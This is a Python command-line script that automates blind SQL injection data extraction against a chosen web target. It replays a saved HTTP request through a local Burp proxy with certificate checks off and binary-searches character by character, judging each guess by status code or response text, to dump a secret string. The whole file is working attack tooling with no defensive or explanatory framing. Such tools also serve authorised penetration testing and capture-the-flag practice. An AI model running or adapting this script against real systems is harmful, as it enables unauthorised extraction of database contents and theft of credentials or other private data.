import requests
import request_parser as request_parser
import argparse
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_argument_parser():
    parser = argparse.ArgumentParser(description="Script for dumping data via Blind SQLi attacks")

    parser.add_argument('-req', required=True, help="Path to the .req file used for making the requests")
    parser.add_argument('-target', required=True, help="The target URL")
    parser.add_argument('-payload', required=True, help="The payload to use with fuzzing values")
    parser.add_argument('-length', required=True, type=int, help="The length of the data we're trying to dump")
    parser.add_argument('-mc', type=int, help="HTTP status code to indicate a successful request")
    parser.add_argument('-mt', help="Text in the HTTP response to indicate a successful request")

    return parser


def make_request(payload:str, guess:str) -> dict:
    payload = payload.replace("FUZZ2", guess)
    req_file_path = args.req
    header_lines, body = request_parser.read_req_file(req_file_path)
    method, endpoint, headers = request_parser.parse_headers(header_lines, payload)
    data = ''.join(body)
    
    # Proxy through burp to see what's going on
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    
    res = requests.request(method, args.target + endpoint, headers=headers, data=data, proxies=proxies, verify=False)
    if res.elapsed.seconds > 20:
        print("\nResponse taking too long, exiting...")
        print()
        exit(0)
    return {
        "statuscode": res.status_code,
        "body": res.text,
        "headers": res.headers
    }

def binary_search(index: str, payload: str) -> str:
    
    possible_values = list("0123456789abcdefghijklmnopqrstuvwxyz")
    payload = payload.replace("FUZZ1", index)
    
    low, high = 0, len(possible_values) - 1

    while low <= high:
        mid = (low + high) // 2
        guess = possible_values[mid]
        
        # Print status
        sys.stdout.write(f"\rDump: ({int(index)}/{args.length}) {dump + guess}")
        sys.stdout.flush()

        # Check
        res = make_request(payload, guess)

        feedback = ""
        if args.mc:
        # Check by statuscode
            if res["statuscode"] == 500:
                feedback = "g"
            elif res["statuscode"] == 200:
                check_res = make_request(payload.replace(">", "="), guess)
                if check_res["statuscode"] == 500:
                    feedback = "e"
                else : feedback = "l"
        else:
        # Check by response body
            if args.mt in str(res["body"]):
                feedback = "g"
            else:
                check_res = make_request(payload.replace(">", "="), guess)
                if args.mt in check_res["body"]:
                    feedback = "e"
                else : feedback = "l"

        if feedback == 'e':
            return guess
        elif feedback == 'l':
            high = mid - 1
        else:
            low = mid + 1

if __name__ == "__main__":
    parser = create_argument_parser()
    args = parser.parse_args()

    if args.mc is None and args.mt is None:
        parser.error("Please specify -mc or -mt. For more info use -h or --help.")

    global dump
    dump = ""
    with open(args.payload, "r") as fr:
        payload = ""
        for line in fr.readlines():
            payload += line

    # Start dumping
    print(f"Started dump at {time.ctime(time.time())}")
    for i in range(args.length):
        i += 1 # Start from 1 rather than 0
        secret = binary_search(str(i), payload)
        if type(secret) != str:
            print("Something went wrong with the HTTP response. Make sure you can ping the target. Exiting...")
            print("\n")
            exit(0)
        dump += secret
        if i == args.length : print("\n")